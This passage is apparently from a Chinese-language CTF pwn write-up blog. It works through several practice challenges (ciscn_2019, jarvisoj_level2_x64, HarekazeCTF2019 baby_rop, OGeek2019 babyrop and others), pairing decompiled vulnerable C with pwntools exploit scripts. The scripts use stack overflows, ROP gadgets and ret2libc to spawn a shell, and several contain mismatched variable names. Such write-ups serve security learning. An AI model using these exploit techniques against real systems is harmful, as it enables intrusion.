hhhhhh  iii nnn  nn ee   e &quot;</span>);<br>  puts(<span class="hljs-string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);<br>  puts(<span class="hljs-string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);<br>  puts(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  puts(<span class="hljs-string">&quot;Welcome to this Encryption machine\n&quot;</span>);<br>  begin();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      fflush(0LL);<br>      n2 = <span class="hljs-number">0</span>;<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n2);<br>      getchar();<br>      <span class="hljs-keyword">if</span> ( n2 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      puts(<span class="hljs-string">&quot;I think you can do it by yourself&quot;</span>);<br>      begin();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( n2 == <span class="hljs-number">3</span> )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( n2 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    encrypt();<br>    begin();<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Something Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 这里就将strlen绕过，编码的话只需要将你的payload给他，拿到编码后的payload再重新发送即可</span><br><span class="hljs-comment">## strlen遇到\x00结束，利用这个特性，payload开头以0开始即可</span><br><br>func_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>-<span class="hljs-number">1</span><br><br>rdiRet = <span class="hljs-number">0x0000000000400c83</span><br>Ret = <span class="hljs-number">0x00000000004006b9</span><br><span class="hljs-comment"># ROPgadget --binary pwn --only &#x27;pop|ret&#x27;</span><br><br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># gdp() 调试，查看是否获取到正确的got值，如果不，那么调整即可</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+overoff * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p(rdiRet) + p(func_got) + p(func_plt) <br><span class="hljs-comment"># puts(puts@got)</span><br>payload += p(again)<br><br>sla(<span class="hljs-string">&quot;encrypted\n&quot;</span>,payload)<br>ru(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>funcAddr = u(rl().strip()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(funcAddr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,funcAddr)<br>libcBase = funcAddr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>SysAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>StrAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + p(Ret) + p(rdiRet) + p(shellStr) + p(sysAddr)<br><span class="hljs-comment"># system(&#x27;/bin/sh/\x00&#x27;)</span><br>sl(payload)<br><br><span class="hljs-comment"># libc6_2.27-0ubuntu3_amd64</span><br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a><font style="color:rgb(33, 37, 41);">jarvisoj_level2_x64</font></h1><blockquote><p>考点</p><ul><li>64位栈溢出（无后门）</li><li>函数参数调整</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  vulnerable_function(argc, argv, envp);<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);<br>&#125;<br><br>ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">128</span>]; // [rsp+0h] [rbp-80h] BYREF<br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x200uLL);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">rdiRet = <span class="hljs-number">0x00000000004006b3</span><br><br>pyaload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x88</span> + p(rdiRet) + p(elf.sym[<span class="hljs-string">&#x27;hint&#x27;</span>]) + p(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br></code></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a><font style="color:rgb(33, 37, 41);">get_started_3dsctf_2016</font></h1><blockquote><p>考点</p><ul><li>缓冲区刷新</li><li>栈溢出+后门</li><li>函数参数调整</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char v4[<span class="hljs-number">56</span>]; // [esp+4h] [ebp-38h] BYREF<br><br>  printf(<span class="hljs-string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="hljs-number">0</span>]);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 这道题由于没有刷新缓冲区，那么就导致如果程序无法正常退出则无法显示flag</span><br><span class="hljs-comment">## 所以最后的返回地址我们要跳到exit(0)上-&gt;0x0804E6A0</span><br><span class="hljs-comment">## 还有就是栈溢出的数据大小并不是0x38+4，而是0x38，这个通过调试可以拿到/其他方法也行</span><br>pyaload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> + p(elf.sym[<span class="hljs-string">&#x27;get_flag&#x27;</span>]) + p(<span class="hljs-number">0x0804E6A0</span>) + p(<span class="hljs-number">0x308CD64F</span>) + p(<span class="hljs-number">0x195719D1</span>)<br></code></pre></td></tr></table></figure><h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a><font style="color:rgb(33, 37, 41);">[HarekazeCTF2019]baby_rop</font></h1><blockquote><p>考点</p><ul><li>栈溢出（无后门）</li><li>ROPgadget</li><li>函数参数调整</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char v4[<span class="hljs-number">16</span>]; // [rsp+0h] [rbp-10h] BYREF<br><br>  system(<span class="hljs-string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, v4);<br>  printf(<span class="hljs-string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">binsh = <span class="hljs-number">0x0601048</span><br>rdiret = <span class="hljs-number">0x000400683</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p(rdiret) + p(binsh) + p(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br></code></pre></td></tr></table></figure><h1 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a><font style="color:rgb(33, 37, 41);">others_shellcode</font></h1><blockquote><p>考点</p><ul><li>系统调用shell</li></ul><p>直接连上就有shell，主要是认识系统怎么实现shell的（侧重汇编）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> getShell()<br>&#123;<br>  <span class="hljs-built_in">int</span> n11; // eax<br>  char _bin__sh[<span class="hljs-number">9</span>]; // [esp-Ch] [ebp-Ch] BYREF<br><br>  strcpy(_bin__sh, <span class="hljs-string">&quot;/bin//sh&quot;</span>);<br>  n11 = <span class="hljs-number">11</span>;<br>  __asm &#123; <span class="hljs-built_in">int</span>     80h; LINUX - sys_execve &#125;<br>  <span class="hljs-keyword">return</span> n11;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a><font style="color:rgb(33, 37, 41);">[OGeek2019]babyrop</font></h1><blockquote><p>考点</p><ul><li>栈溢出</li><li>Ret2libc</li><li>数据接收</li><li>strlen绕过</li></ul><p>这道题有问题</p><ul><li>本地的偏移并不是0xE7（可能是我机子的问题），远程环境的是对的</li><li>libcSearch出的libc无法打通，使用题目提供的libc可以打通</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> sub_80486BB()<br>&#123;<br>  alarm(0x3Cu);<br>  signal(<span class="hljs-number">14</span>, handler);<br>  setvbuf(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> setvbuf(stderr, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl sub_804871F(<span class="hljs-built_in">int</span> buf)<br>&#123;<br>  size_t n; // eax<br>  char s[<span class="hljs-number">32</span>]; // [esp+Ch] [ebp-4Ch] BYREF<br>  char bufa[<span class="hljs-number">32</span>]; // [esp+2Ch] [ebp-2Ch] BYREF<br>  ssize_t v5; // [esp+4Ch] [ebp-Ch]<br><br>  memset(s, <span class="hljs-number">0</span>, sizeof(s));<br>  memset(bufa, <span class="hljs-number">0</span>, sizeof(bufa));<br>  sprintf(s, <span class="hljs-string">&quot;%ld&quot;</span>, buf);<br>  v5 = read(<span class="hljs-number">0</span>, bufa, 0x20u);<br>  bufa[v5 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  n = strlen(bufa);<br>  <span class="hljs-keyword">if</span> ( strncmp(bufa, s, n) )<br>    exit(<span class="hljs-number">0</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Correct\n&quot;</span>, 8u);<br>  <span class="hljs-keyword">return</span> (unsigned __int8)bufa[<span class="hljs-number">7</span>];<br>&#125;<br><br>ssize_t __cdecl sub_80487D0(char nbytes)<br>&#123;<br>  _BYTE buf[<span class="hljs-number">231</span>]; // [esp+11h] [ebp-E7h] BYREF<br><br>  <span class="hljs-keyword">if</span> ( nbytes == <span class="hljs-number">127</span> )<br>    <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0xC8u);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, nbytes);<br>&#125;<br><br><span class="hljs-built_in">int</span> main()<br>&#123;<br>  <span class="hljs-built_in">int</span> buf; // [esp+4h] [ebp-14h] BYREF<br>  char v2; // [esp+Bh] [ebp-Dh]<br>  <span class="hljs-built_in">int</span> fd; // [esp+Ch] [ebp-Ch]<br><br>  sub_80486BB();<br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &gt; <span class="hljs-number">0</span> )<br>    read(fd, &amp;buf, 4u);<br>  v2 = sub_804871F(buf);<br>  sub_80487D0(v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>again = <span class="hljs-number">0x08048825</span><br><br>bufa = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span><br>sl(bufa)<br><br>payload = junk(<span class="hljs-number">0xE7</span>+<span class="hljs-number">4</span>) + p(func_plt) + p(again) + p(<span class="hljs-number">1</span>)+  p(func_got) + p(<span class="hljs-number">4</span>)<br>sl(payload)<br>ru(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br>func_addr = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br>libcBase = func_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>SysAddr = libcBase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>StrAddr = libcBase + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>bufa = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span><br>sl(bufa)<br><br>payload = junk(<span class="hljs-number">0xE7</span>+<span class="hljs-number">4</span>) + p(sysAddr)+ p(again) + p(shellStr)<br>sla(<span class="hljs-string">&#x27;Correct&#x27;</span>,payload)<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_n_5</font></h1><blockquote><p>考点</p><ul><li>64位栈溢出</li><li>Ret2libc</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char text[<span class="hljs-number">30</span>]; // [rsp+0h] [rbp-20h] BYREF<br><br>  setvbuf(stdout, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  puts(<span class="hljs-string">&quot;tell me your name&quot;</span>);<br>  read(<span class="hljs-number">0</span>, name, 0x64uLL);<br>  puts(<span class="hljs-string">&quot;wow~ nice name!&quot;</span>);<br>  puts(<span class="hljs-string">&quot;What do you want to say to me?&quot;</span>);<br>  gets(text);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><br>func_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x20</span>+<span class="hljs-number">8</span><br><br>rdiRet = <span class="hljs-number">0x0000000000400713</span><br>Ret = <span class="hljs-number">0x00000000004004c9</span><br><br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p(rdiRet) + p(func_got) + p(func_plt) <br>payload += p(again)<br><br>sla(<span class="hljs-string">&quot;to me?\n&quot;</span>,payload)<br><br>funcAddr = u(rl().strip()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lgs(<span class="hljs-built_in">hex</span>(funcAddr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,funcAddr)<br>libcBase = funcAddr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sysAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>shellStr = libcBase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + p(Ret) + p(rdiRet) + p(shellStr) + p(sysAddr)<br><br>sl(payload)<br></code></pre></td></tr></table></figure><h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a><font style="color:rgb(33, 37, 41);">not_the_same_3dsctf_2016</font></h1><blockquote><p>考点</p><ul><li>32位栈溢出+后门</li><li>函数参数调整</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  _BYTE v4[<span class="hljs-number">45</span>]; // [esp+Fh] [ebp-2Dh] BYREF<br><br>  printf(<span class="hljs-string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-built_in">int</span> get_secret()<br>&#123;<br>  <span class="hljs-built_in">int</span> v0; // esi<br><br>  v0 = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);<br>  fgets(&amp;fl4g, <span class="hljs-number">45</span>, v0);<br>  <span class="hljs-keyword">return</span> fclose(v0);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 将flag读到全局变量中，但是没有输出，我们找到write输出（printf、puts等）将其输出</span><br><span class="hljs-comment">## p(0)是上一个函数（backdoor）的参数，尽管它不需要参数，所以这里就起到了一个占位的作用。在观察write的汇编中可以看到，[esp+4]的位置是用不上的，但是如果不占位，那么我们构造的函数的参数就会出问题</span><br>backdoor = <span class="hljs-number">0x080489A0</span><br>flag = <span class="hljs-number">0x080ECA2D</span><br>Write = <span class="hljs-number">0x00806E27A</span><br><br>payload = junk(<span class="hljs-number">0x2d</span>) + p(backdoor) + p(Write) + p(<span class="hljs-number">0</span>) + p(<span class="hljs-number">1</span>) + p(flag) + p(<span class="hljs-number">45</span>)<br>sl(payload)<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_en_2</font></h1><blockquote><p>就是ciscn_2019_c_1</p></blockquote><h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_ne_5</font></h1><blockquote><p>考点</p><ul><li>32位栈溢出（无后门）</li><li>函数参数调整</li><li>ROPgadget</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl AddLog(char *src)<br>&#123;<br>  printf(<span class="hljs-string">&quot;Please input new log info:&quot;</span>);<br>  <span class="hljs-keyword">return</span> __isoc99_scanf(<span class="hljs-string">&quot;%128s&quot;</span>, src);<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl GetFlag(char *src)<br>&#123;<br>  char dest[<span class="hljs-number">4</span>]; // [esp+0h] [ebp-48h] BYREF<br>  _BYTE buf[<span class="hljs-number">60</span>]; // [esp+4h] [ebp-44h] BYREF<br><br>  *(_DWORD *)dest = <span class="hljs-number">48</span>;<br>  memset(buf, <span class="hljs-number">0</span>, sizeof(buf));<br>  strcpy(dest, src);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;The flag is your log:%s\n&quot;</span>, dest);<br>&#125;<br><br><br><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> result; // eax<br>  <span class="hljs-built_in">int</span> s1_; // [esp+0h] [ebp-100h] BYREF<br>  char src[<span class="hljs-number">4</span>]; // [esp+4h] [ebp-FCh] BYREF<br>  char buf_1[<span class="hljs-number">124</span>]; // [esp+8h] [ebp-F8h] BYREF<br>  char s1[<span class="hljs-number">4</span>]; // [esp+84h] [ebp-7Ch] BYREF<br>  _BYTE buf[<span class="hljs-number">96</span>]; // [esp+88h] [ebp-78h] BYREF<br>  <span class="hljs-built_in">int</span> *p_argc; // [esp+F4h] [ebp-Ch]<br><br>  p_argc = &amp;argc;<br>  setbuf(stdin, <span class="hljs-number">0</span>);<br>  setbuf(stdout, <span class="hljs-number">0</span>);<br>  setbuf(stderr, <span class="hljs-number">0</span>);<br>  fflush(stdout);<br>  *(_DWORD *)s1 = <span class="hljs-number">48</span>;<br>  memset(buf, <span class="hljs-number">0</span>, sizeof(buf));<br>  *(_DWORD *)src = <span class="hljs-number">48</span>;<br>  memset(buf_1, <span class="hljs-number">0</span>, sizeof(buf_1));<br>  puts(<span class="hljs-string">&quot;Welcome to use 